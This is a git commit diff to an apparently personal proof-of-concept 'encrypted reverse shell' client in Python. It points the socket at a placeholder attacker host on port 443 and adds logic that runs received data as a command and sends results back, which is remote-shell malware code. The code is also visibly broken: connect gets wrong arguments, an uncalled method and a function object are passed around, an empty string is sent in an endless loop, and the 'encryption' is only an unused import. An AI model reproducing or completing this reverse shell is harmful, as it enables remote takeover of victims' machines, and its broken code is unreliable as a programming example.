46b6b3b2c9e2e08ad8ce840be3a51bbd24eb3726
Zin <zinedinemokhefi@gmail.com>
2025-05-09 22:32:25 +0200

    watch

--- Python_bind_shell/encrypted_rev_shell_client.py
+++ Python_bind_shell/encrypted_rev_shell_client.py
@@ -2,13 +2,14 @@ import socket
 import subprocess
 import threading
 import argparse
+import crypt
 
 """ An Encrypted Reverse_Shell written in Python """
 """ POC, meaning, has to be modified for real world use"""
 
 MAX_BUFF = 4096
 DEFAULT_PORT = 443
-HOST = "ADRESS"
+HOST = "ADRESS_OF_ATTACKER"
 
 
 sock_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -16,12 +17,15 @@ sock_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
     sock_client.connect(HOST,DEFAULT_PORT)
     data = sock_client.recv(MAX_BUFF)
-    if data.decode() == "ready":
-        pass
+    if data.decode():
+        subprocess.run(data.decode)
+        sock_client.send(subprocess.run)
+        while True:
+            sock_client.send("")
     exit(0)
 
 except Exception as e:
     print("Connection failed")
-    exit(1)
+    exit(1) 
 
 
